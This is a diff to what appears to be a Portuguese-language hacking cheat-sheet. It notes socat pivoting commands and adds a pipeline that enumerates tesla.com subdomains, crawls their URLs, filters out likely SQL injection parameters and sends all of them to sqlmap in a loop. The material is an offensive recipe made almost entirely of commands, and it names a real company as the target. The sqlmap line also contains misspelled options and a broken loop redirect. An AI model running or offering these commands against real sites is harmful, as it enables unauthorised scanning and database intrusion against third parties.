@@ -19,3 +19,18 @@ Comand = wget https://github.com/andrew-d/static-binaries/raw/master/binaries/li
 Tutorial = https://deephacking.tech/pivoting-con-socat/
 </br>
 Uso= ./socat tcp-l:7878,fork,reuseaddr tcp:172.16.0.147:80 &
+
+
+<h2>Pegando params para sqli</h2>
+
+pegando target das url: 
+
+subfinder -d tesla.com -silent -all | httpx -silent -threads 100 | katana -d 4 -jc -ef css,png,svg,ico,woff,gif | tee -a urls.txt
+
+filtrando potenciais sqli: 
+
+cat urls | gf sqli | tee -a sqli.txt
+
+jogando para sqlmap:
+
+while read line; do sqlmap -u $line --parse-erros --current-db --invalid-logical --invalid-bignum --invalid-string --riks 3;done sqli.txt
